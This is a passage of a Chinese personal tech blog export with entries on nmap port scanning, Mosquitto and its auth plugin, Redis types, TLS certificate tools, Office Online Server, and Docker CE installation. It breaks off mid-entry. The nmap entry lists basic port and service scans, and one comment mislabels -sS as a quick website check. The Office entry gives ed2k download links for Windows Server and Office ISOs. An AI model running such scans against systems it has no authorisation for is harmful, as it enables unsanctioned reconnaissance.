    <title>Nmap扫描端口常用命令</title>
    <url>/Web%E5%90%8E%E7%AB%AF/nmap%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 默认</span><br><span class="line">$ sudo nmap 192.168.1.88</span><br><span class="line"></span><br><span class="line"># 检查指定端口范围</span><br><span class="line">$ sudo nmap -p1880-9002 192.168.1.88</span><br><span class="line"></span><br><span class="line"># 检查指定端口,多个用逗号隔开</span><br><span class="line">$ sudo nmap -p1883,9001 192.168.1.88</span><br><span class="line"></span><br><span class="line"># 迅速检查网站是否正常运行</span><br><span class="line">$ sudo nmap -sS 192.168.1.88</span><br><span class="line"></span><br><span class="line"># 检查在目标系统上运行的服务</span><br><span class="line">$ sudo nmap -sV 192.168.1.88</span><br><span class="line"></span><br><span class="line"># 检查目标系统的打开端口</span><br><span class="line">$ sudo nmap -vv 192.168.1.88</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Mosquitto从零部署</title>
    <url>/Web%E5%90%8E%E7%AB%AF/mosquitto%E4%BB%8E%E9%9B%B6%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>全新的Ubuntu 16.04，所需编译环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install build-essential openssl libssl-dev libc-ares-dev uuid-dev cmake -y</span></span><br></pre></td></tr></table></figure>
<h3 id="安装libwebsockets"><a href="#安装libwebsockets" class="headerlink" title="安装libwebsockets"></a>安装libwebsockets</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://warmcat.com/git/libwebsockets/snapshot/libwebsockets-3.0.0.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -zxvf libwebsockets-3.0.0.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> libwebsockets-3.0.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir build</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> build</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cmake ..</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使库文件软链接立刻生效</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></span><br></pre></td></tr></table></figure>
<h3 id="安装mosquttio"><a href="#安装mosquttio" class="headerlink" title="安装mosquttio"></a>安装mosquttio</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://mosquitto.org/files/<span class="built_in">source</span>/mosquitto-1.5.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -zxvf mosquitto-1.5.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> mosquitto-1.5/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim mosquitto.conf</span></span><br><span class="line"></span><br><span class="line">port 1883</span><br><span class="line">protocol mqtt</span><br><span class="line"></span><br><span class="line">listener 9001</span><br><span class="line">protocol websockets</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim config.mk</span></span><br><span class="line">WITH_WEBSOCKETS:=yes</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使库文件软链接立刻生效</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ldconfig</span></span><br></pre></td></tr></table></figure>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mosquitto -c /etc/mosquitto/mosquitto.conf.example</span></span><br><span class="line">1527152208: mosquitto version 1.5 starting</span><br><span class="line">1527152208: Config loaded from /etc/mosquitto/mosquitto.conf.</span><br><span class="line">1527152208: Opening websockets listen socket on port 9001.</span><br><span class="line">1527152208: Opening ipv4 listen socket on port 1883.</span><br><span class="line">1527152208: Opening ipv6 listen socket on port 1883.</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mosquitto -c /etc/mosquitto/mosquitto.conf.example -d (守护进程)</span></span><br></pre></td></tr></table></figure>
<h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/mosquitto/mosquitto.conf</span></span><br><span class="line">allow_anonymous false</span><br><span class="line">password_file /etc/mosquitto/pwfile.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 表示覆盖创建用户， pwfile会被清空</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mosquitto_passwd -c /etc/mosquitto/pwfile.conf admin</span></span><br><span class="line"><span class="meta">#</span><span class="bash">输入两次密码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mosquitto_passwd /etc/mosquitto/pwfile.conf <span class="built_in">test</span></span></span><br></pre></td></tr></table></figure>
<p><a href="http://lostphp.com/blog/900.html" target="_blank" rel="noopener">更多配置参考</a></p>
<h3 id="授权插件"><a href="#授权插件" class="headerlink" title="授权插件"></a>授权插件</h3><p>如上手动添加用户在生产环境不太现实，接下来将通过HTTP插件实现用户授权管理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/jpmens/mosquitto-auth-plug.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> mosquitto-auth-plug</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp config.mk.in config.mk</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim config.mk</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开HTTP授权的方式</span></span><br><span class="line">BACKEND_HTTP ?= yes</span><br><span class="line"><span class="meta">#</span><span class="bash"> mosquitto 源码的路径</span></span><br><span class="line">MOSQUITTO_SRC = /home/root/mosquitto-1.5</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果报错 fatal error: curl/curl.h: No such file or directory</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装libcurl4-openssl-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libcurl4-openssl-dev</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将编译好的so文件和 mosquitto 放在一起</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp auth-plug.so /usr/<span class="built_in">local</span>/sbin/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/mosquitto/mosquitto.conf</span></span><br><span class="line"><span class="meta">#</span><span class="bash">password_file /etc/mosquitto/pwfile.conf</span></span><br><span class="line">auth_plugin /usr/local/sbin/auth-plug.so</span><br><span class="line"></span><br><span class="line">auth_opt_backends http</span><br><span class="line">auth_opt_http_ip 192.168.5.33</span><br><span class="line">auth_opt_http_port 8089</span><br><span class="line">auth_opt_http_getuser_uri /auth</span><br><span class="line">auth_opt_http_superuser_uri /superuser</span><br><span class="line">auth_opt_http_aclcheck_uri /acl</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启 mosquitto</span></span><br></pre></td></tr></table></figure>
<p>安装完成插件之后，只要编写授权的 <a href="https://github.com/jpmens/mosquitto-auth-plug/blob/master/examples/http-auth-be.py" target="_blank" rel="noopener">HTTP服务</a>，响应插件发起的授权请求，通过响应码返回结果就OK了。<br>除了HTTP，还可以通过MySQL/Redis等数据库来实现。</p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>一款由python编写开源的跳板机(堡垒机)系统</title>
    <url>/Web%E5%90%8E%E7%AB%AF/%E4%B8%80%E6%AC%BE%E7%94%B1python%E7%BC%96%E5%86%99%E5%BC%80%E6%BA%90%E7%9A%84%E8%B7%B3%E6%9D%BF%E6%9C%BA(%E5%A0%A1%E5%9E%92%E6%9C%BA)%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>类似青云那样的管理Linux主机的Web系统</p>
<p><a href="https://github.com/jumpserver/jumpserver/wiki/" target="_blank" rel="noopener">https://github.com/jumpserver/jumpserver/wiki/</a></p>
<p><a href="http://www.oschina.net/p/jumpserver" target="_blank" rel="noopener">http://www.oschina.net/p/jumpserver</a></p>
<p><img src="https://github.com/ibuler/static/raw/master/jumpserver3/index.jpg" alt></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>redis五种数据类型整理</title>
    <url>/Web%E5%90%8E%E7%AB%AF/redis%E4%BA%94%E7%A7%8D%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>为了方便复习redis的数据类型，根据网络文章整理一份。</p>
<h3 id="一、Redis-字符串-String"><a href="#一、Redis-字符串-String" class="headerlink" title="一、Redis 字符串(String)"></a>一、Redis 字符串(String)</h3><p>字符串类型是最基础的类型，在redis里面字符串可以存储3中类型的值，字节串、整数、浮点数。<br>这里整数或者浮点数是可以执行自增或自减的。<br>使用场景：</p>
<ol>
<li>计数</li>
<li>分布式锁</li>
<li>缓存数据</li>
</ol>
<h3 id="二、Redis-列表-List"><a href="#二、Redis-列表-List" class="headerlink" title="二、Redis 列表(List)"></a>二、Redis 列表(List)</h3><p>列表类似于数据结构的链表，可以给定int范围去显示这个列表中的数据。<br>列表允许用户从序列的两端推入或者弹出元素，获取列表元素。<br>列表的一个主要优点在于他可以包含多个字符串值，而且都集中在一个区域，而且多个字符串是可以重复的。<br>使用场景：</p>
<ol>
<li>存储任务信息</li>
<li>最近浏览过的文章</li>
<li>联系人信息</li>
<li>消息队列</li>
</ol>
<h3 id="三、Redis-哈希-Hash"><a href="#三、Redis-哈希-Hash" class="headerlink" title="三、Redis 哈希(Hash)"></a>三、Redis 哈希(Hash)</h3><p>redis的哈希可以存储多个键值对之间的映射。<br>哈希在很多方面就像一个微缩版的redis，不少字符串命令都有相应的哈希版本。<br>一个key name的哈希中，有多个key-value对。我们可以把这种数据聚集看做是关系库中的行。<br>使用场景：</p>
<ol>
<li>存储对象(频繁增删)</li>
<li>购物车</li>
<li>关系数据库的缓存</li>
</ol>
<h3 id="四、Redis-集合-Set"><a href="#四、Redis-集合-Set" class="headerlink" title="四、Redis 集合(Set)"></a>四、Redis 集合(Set)</h3><p>redis的集合以无序的方式来“存储多个各不相同”的元素，用户可以快速地对集合执行“添加元素”操作、“移除元素”操作以及“检查一个元素是否存在”于集合中。<br><strong>集合跟列表不同</strong>之处在于，列表可以存储<strong>多个相同</strong>的字符串，而集合则通过使用Hash来保证存储的字符串各<strong>不相同</strong>（这些Hash只有key，并没有与key相关联的value）。<br>使用场景：</p>
<ol>
<li>计算交集、并集、差集</li>
<li>共同好友</li>
<li>利用唯一性,统计访问网站的所有独立IP</li>
<li>好友推荐时,根据tag求交集,大于某个阈值就可以推荐</li>
</ol>
<h3 id="五、Redis-有序集合-sorted-set"><a href="#五、Redis-有序集合-sorted-set" class="headerlink" title="五、Redis 有序集合(sorted set)"></a>五、Redis 有序集合(sorted set)</h3><p>“有序集合”相比“集合”多出一个分值（score），分值必须为浮点数。有序集合既可以根据成员访问，又可以根据分值或分值的排列顺序来访问的结构。<br>使用场景：</p>
<ol>
<li>排行榜</li>
<li>带权重的消息队列</li>
</ol>
<hr>
<p>内容来自：</p>
<ul>
<li><a href="https://www.runoob.com/redis/redis-data-types.html" target="_blank" rel="noopener">Redis 数据类型 | 菜鸟教程</a></li>
<li><a href="https://www.cnblogs.com/qixinbo/p/9533296.html" target="_blank" rel="noopener">Redis五种数据类型</a></li>
</ul>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>云存储平台Seafile</title>
    <url>/Web%E5%90%8E%E7%AB%AF/%E4%BA%91%E5%AD%98%E5%82%A8%E5%B9%B3%E5%8F%B0Seafile/</url>
    <content><![CDATA[<p><a href="https://github.com/haiwen/seafile" target="_blank" rel="noopener">https://github.com/haiwen/seafile</a></p>
<p>Seafile 的目标是给企业提供一个安全的云存储平台，满足企业文件的共享和协作的需求。</p>
<p>Seafile 采用开源的方式来进行产品开发。开源帮助 Seafile 成为了一个国际化的项目，并吸引了全球用户的参与和贡献。目前我们已经在 Github 开源代码托管平台上有了 3900 多个关注。全球用户的使用、反馈和审核使得 Seafile 更加的安全和稳定。</p>
<p>截至 2016 年初，Seafile 已经有超过 30 万用户使用，并拥有卡巴斯基，德国 Mainz 大学，德国 HU Berlin 大学和法国 Strasbourg 大学等大型组织机构客户。</p>
<p><a href="https://www.seafile.com/home/" target="_blank" rel="noopener">https://www.seafile.com/home/</a></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>简易HTTPS 加密证书的工具</title>
    <url>/Web%E5%90%8E%E7%AB%AF/%E7%AE%80%E6%98%93HTTPS%20%E5%8A%A0%E5%AF%86%E8%AF%81%E4%B9%A6%E7%9A%84%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h3 id="1-keytool"><a href="#1-keytool" class="headerlink" title="1. keytool"></a>1. keytool</h3><p>JDK中keytool是一个证书管理工具，可以生成“自签名证书”，多用于Java应用，如：Tomcat。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ keytool -genkey -<span class="built_in">alias</span> tomcat  -storetype PKCS12 -keyalg RSA -keysize 2048  -keystore keystore.p12 -validity 3650</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line">*** (输入详细信息)</span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">keystore.p12  (生成p12格式证书)</span><br></pre></td></tr></table></figure></p>
<h3 id="2-openssl"><a href="#2-openssl" class="headerlink" title="2. openssl"></a>2. openssl</h3><blockquote>
<p>数字证书管理工具openssl和keytool的区别： keytool没办法签发证书，而openssl能够进行签发和证书链的管理。</p>
</blockquote>
<p>openssl也可以生成“自签名证书”，但不止于此，它还能够进行“签发”和“管理证书链”(双向认证)。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成私钥文件</span></span><br><span class="line">$ openssl genrsa -des3 -out server.key 2048 </span><br><span class="line">(输入安全密码)</span><br><span class="line"><span class="comment"># 生成CSR（证书签名请求）</span></span><br><span class="line">$ openssl req -new -key server.key -out server.csr </span><br><span class="line"></span><br><span class="line">Country Name (2 letter code) [AU]:CN</span><br><span class="line">State or Province Name (full name) [Some-State]:Shenzhun</span><br><span class="line">Locality Name (eg, city) []:Shenzhun</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:ApGo  (公司名称)</span><br><span class="line">Organizational Unit Name (eg, section) []:technology</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:localhost  （Common Name应该与域名保持一致，否则会引起浏览器警告）</span><br><span class="line">Email Address []:admin@localhost</span><br><span class="line"></span><br><span class="line">Please enter the following <span class="string">'extra'</span> attributes</span><br><span class="line">to be sent with your certificate request</span><br><span class="line">A challenge password []:(可不填)</span><br><span class="line">An optional company name []:(可不填)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成自签名证书</span></span><br><span class="line">$ openssl x509 -req -days 365 -<span class="keyword">in</span> server.csr -signkey server.key -out server.crt</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">server.crt  server.csr  server.key  (生成crt格式证书)</span><br></pre></td></tr></table></figure></p>
<h3 id="3-mkcert"><a href="#3-mkcert" class="headerlink" title="3. mkcert"></a>3. mkcert</h3><p><a href="https://github.com/FiloSottile/mkcert" target="_blank" rel="noopener">mkcert</a> 是生成本地 HTTPS 加密证书的工具，一个命令就可以生成证书，不需要任何配置。</p>
<p>在 Linux 上，安装 certutil<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt install libnss3-tools</span><br><span class="line"></span><br><span class="line">$ sudo yum install nss-tools</span><br></pre></td></tr></table></figure></p>
<p>使用示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkcert -install</span><br><span class="line">Created a new local CA at &quot;/Users/filippo/Library/Application Support/mkcert&quot; 💥</span><br><span class="line">The local CA is now installed in the system trust store! ⚡️</span><br><span class="line">The local CA is now installed in the Firefox trust store (requires restart)! 🦊</span><br><span class="line"></span><br><span class="line">$ mkcert example.com &apos;*.example.org&apos; myapp.dev localhost 127.0.0.1 ::1</span><br><span class="line">Using the local CA at &quot;/Users/filippo/Library/Application Support/mkcert&quot; ✨</span><br><span class="line"></span><br><span class="line">Created a new certificate valid for the following names 📜</span><br><span class="line"> - &quot;example.com&quot;</span><br><span class="line"> - &quot;*.example.org&quot;</span><br><span class="line"> - &quot;myapp.dev&quot;</span><br><span class="line"> - &quot;localhost&quot;</span><br><span class="line"> - &quot;127.0.0.1&quot;</span><br><span class="line"> - &quot;::1&quot;</span><br><span class="line"></span><br><span class="line">The certificate is at &quot;./example.com+5.pem&quot; and the key at &quot;./example.com+5-key.pem&quot; ✅</span><br></pre></td></tr></table></figure>
<p><a href="https://keer.me/Using-mkcert-to-generate-local-HTTPS-certificates.html" target="_blank" rel="noopener">使用方法参考</a></p>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
      <tags>
        <tag>ssl,https</tag>
      </tags>
  </entry>
  <entry>
    <title>部署Office-Online</title>
    <url>/Web%E5%90%8E%E7%AB%AF/%E9%83%A8%E7%BD%B2Office-Online/</url>
    <content><![CDATA[<ul>
<li><a href="http://blog.ruterfu.com/2019/03/26/install-office-server-2017-on-winserver2016/" target="_blank" rel="noopener">【详细博文】</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/officeonlineserver/deploy-office-online-server" target="_blank" rel="noopener">【官方教程】</a></li>
<li><a href="https://github.com/ethendev/wopihost" target="_blank" rel="noopener">【实现在线编辑示例】</a></li>
</ul>
<p>部署的相当多坑的，如果顺利，按照上面的资料走，基本不会有问题。下面记录一些坑位。</p>
<blockquote>
<p>我是在VMWare虚拟机上做的测试，需要两台Windows服务器。</p>
</blockquote>
<h2 id="坑位"><a href="#坑位" class="headerlink" title="坑位"></a>坑位</h2><ol>
<li>系统版本，windows server 2012，安装域控制和office online一直有未知错误。</li>
<li>安装好系统之后，不要激活，不要安装更新补丁，建议马上拍一个快照。</li>
</ol>
<h2 id="安装所选择的资源"><a href="#安装所选择的资源" class="headerlink" title="安装所选择的资源"></a>安装所选择的资源</h2><ol>
<li>系统选择 win server 2016 数据中心版</li>
<li>系统安装完，克隆两台链接虚拟机，分别做 <code>AD域控制</code> 和 <code>office-online</code> </li>
<li><code>office-online</code> 要加入到AD域中</li>
<li><code>op/view.aspx</code> 预览的src中的文档路径必须是域名</li>
<li><code>wopi</code> 协议编辑中，src支持IP</li>
</ol>
<h2 id="office-online常用命令"><a href="#office-online常用命令" class="headerlink" title="office-online常用命令"></a>office-online常用命令</h2><ol>
<li><p>新建一个服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-OfficeWebAppsFarm -InternalUrl &quot;http://win-ofs.test.com&quot; -ExternalUrl &quot;http://192.168.1.108&quot;  -AllowHttp -EditingEnabled -OpenFromUrlEnabled</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-OfficeWebAppsFarm -OpenFromUrlEnabled:$true</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="常用地址"><a href="#常用地址" class="headerlink" title="常用地址"></a>常用地址</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.1.108/hosting/discovery</span><br><span class="line">http://192.168.1.108/op/generate.aspx#</span><br></pre></td></tr></table></figure>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2016_updated_feb_2018_x64_dvd_11636703.iso|6294265856|4077CEBEBB40AFA5A66017D2EC7A9CD5|/</span><br><span class="line"></span><br><span class="line">ed2k://|file|cn_office_online_server_last_updated_november_2017_x64_dvd_100181918.iso|770267136|0660AFCFE1AC9A62E749194874643E98|/</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>SmartLink和AirKiss原理解析</title>
    <url>/WiFi/SmartLink%E5%92%8CAirKiss%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>简单分析当前主流IOT的WiFi方案Smartlink</p>
<p>从原理上讲,只要芯片驱动支持开启混杂模式(WiFi Promiscuous),就可以支持一键配网功能,只是各个厂家叫法及实现编码方式不同而已。</p>
<p><a href="https://www.cnblogs.com/80scd/p/5881993.html" target="_blank" rel="noopener">SmartLink传送门</a></p>
<p><a href="http://www.cnblogs.com/80scd/p/5882055.html" target="_blank" rel="noopener">AirKiss传送门</a></p>
]]></content>
      <categories>
        <category>WiFi</category>
      </categories>
  </entry>
  <entry>
    <title>阿里云的云数据库MongoDb版使用记录</title>
    <url>/Web%E5%90%8E%E7%AB%AF/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%E4%BA%91%E6%95%B0%E6%8D%AE%E5%BA%93MongoDb%E7%89%88%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>不经常登录阿里云控制台管理数据库，时间久了就遗忘了，记录一下方便以后使用。</p>
<ol>
<li><p>购买“云数据库MongoDb版”打开控制台<br><img src="/images/云数据库MongoDb/1.png" alt></p>
</li>
<li><p>点击 “登录数据库” 跳转到阿里的 “数据管理DMS”<br><img src="/images/云数据库MongoDb/2.png" alt></p>
</li>
<li><p>“数据管理DMS”<br><img src="/images/云数据库MongoDb/3.png" alt></p>
</li>
<li><p>DMS登录实例<br><img src="/images/云数据库MongoDb/4.png" alt><br><img src="/images/云数据库MongoDb/5.png" alt></p>
</li>
<li><p>DMS控制台<br><img src="/images/云数据库MongoDb/6.png" alt></p>
</li>
<li><p>DMS创建新的数据库<br><img src="/images/云数据库MongoDb/7.png" alt><br><img src="/images/云数据库MongoDb/8.png" alt></p>
</li>
<li><p>为新的数据库创建连接用户<br><img src="/images/云数据库MongoDb/9.png" alt><br><img src="/images/云数据库MongoDb/10.png" alt><br><img src="/images/云数据库MongoDb/11.png" alt></p>
</li>
<li><p>DMS打开数据库<br><img src="/images/云数据库MongoDb/12.png" alt></p>
</li>
<li><p>DMS执行查询命令<br><img src="/images/云数据库MongoDb/13.png" alt></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web后端</category>
      </categories>
  </entry>
  <entry>
    <title>一、DockerCE-在Ubuntu上安装</title>
    <url>/docker/%E4%B8%80%E3%80%81DockerCE-%E5%9C%A8Ubuntu%E4%B8%8A%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p><a href="https://docs.docker-cn.com/engine/installation/linux/docker-ce/ubuntu/#%E5%8D%B8%E8%BD%BD-docker-ce" target="_blank" rel="noopener">参考文档</a></p>
<blockquote>
<p>环境：Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-97-generic x86_64)</p>
</blockquote>
<ol>
<li><p>查看分发版</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsb_release -cs</span><br><span class="line"></span><br><span class="line">xenial</span><br></pre></td></tr></table></figure>
</li>
<li><p>更新源</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装软件包</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加 Docker 的官方 GPG 密钥</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证密钥指纹</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@bogon:~#  sudo apt-key fingerprint 0EBFCD88</span><br><span class="line">pub   4096R/0EBFCD88 2017-02-22</span><br><span class="line">	  Key fingerprint = 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   4096R/F273FCD8 2017-02-22</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入软件源信息，用阿里云的国内快一些。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">aliyun</span></span><br><span class="line">sudo add-apt-repository "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">官方</span></span><br><span class="line">sudo add-apt-repository \</span><br><span class="line">	"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><br><span class="line"><span class="meta">	$</span><span class="bash">(lsb_release -cs) \</span></span><br><span class="line">	stable"</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装最新版社区版</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看版本</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker version</span><br></pre></td></tr></table></figure>
<p> 结果</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Client:</span><br><span class="line">Version:           18.09.5</span><br><span class="line">API version:       1.39</span><br><span class="line">Go version:        go1.10.8</span><br><span class="line">Git commit:        e8ff056</span><br><span class="line">Built:             Thu Apr 11 04:44:24 2019</span><br><span class="line">OS/Arch:           linux/amd64</span><br><span class="line">Experimental:      false</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line">Engine:</span><br><span class="line">Version:          18.09.5</span><br><span class="line">API version:      1.39 (minimum version 1.12)</span><br><span class="line">Go version:       go1.10.8</span><br><span class="line">Git commit:       e8ff056</span><br><span class="line">Built:            Thu Apr 11 04:10:53 2019</span><br><span class="line">OS/Arch:          linux/amd64</span><br><span class="line">Experimental:     false</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证是否正确安装了 Docker CE</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker run hello-world</span></span><br><span class="line">Unable to find image 'hello-world:latest' locally</span><br><span class="line">latest: Pulling from library/hello-world</span><br><span class="line">1b930d010525: Pull complete </span><br><span class="line">Digest: sha256:5f179596a7335398b805f036f7e8561b6f0e32cd30a32f5e19d17a3cda6cc33d</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"><span class="meta"> $</span><span class="bash"> docker run -it ubuntu bash</span></span><br><span class="line">--------------------------------------------------------------------- </span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -it ubuntu bash </span></span><br><span class="line">Unable to find image 'ubuntu:latest' locally</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">f476d66f5408: Pull complete </span><br><span class="line">8882c27f669e: Pull complete </span><br><span class="line">d9af21273955: Pull complete </span><br><span class="line">f5029279ec12: Pull complete </span><br><span class="line">Digest: sha256:70fc21e832af32eeec9b0161a805c08f6dddf64d341748379de9a527c01b6ca1</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line">root@64cf93148c4b:/# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">root@64cf93148c4b:/# </span><br><span class="line">这里是已经进入到 docker 镜像 ubuntu 的bash环境里面了</span><br></pre></td></tr></table></figure>
</li>
<li><p>常用命令</p>
